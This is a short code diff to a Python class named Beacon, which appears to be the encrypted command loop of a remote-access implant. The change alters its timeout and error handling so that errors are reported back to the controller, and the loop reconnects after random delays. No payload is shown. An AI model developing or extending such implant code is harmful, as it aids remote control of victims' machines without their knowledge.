@@ -65,7 +65,6 @@ class Beacon:
    def run(self):
       try:
          while self.running:
-               self.sock.settimeout(5)
                try:
                   data = self.decrypt(self.sock.recv(4096)).decode()
                   if not data:
@@ -82,8 +81,10 @@ class Beacon:
                      self.sock.send(self.encrypt("ACTIVE".encode()))
                   else:
                      self.sock.send(self.encrypt("Unknown Error".encode()))
-               except socket.timeout:
-                  continue
+               except Exception as e:
+                  if self.debugging == True:
+                     print(f"Error: {str(e)}")
+                  self.sock.send(self.encrypt(f"Error: {str(e)}".encode()))
       except:
          try:
             time.sleep(random.randint(120,300))
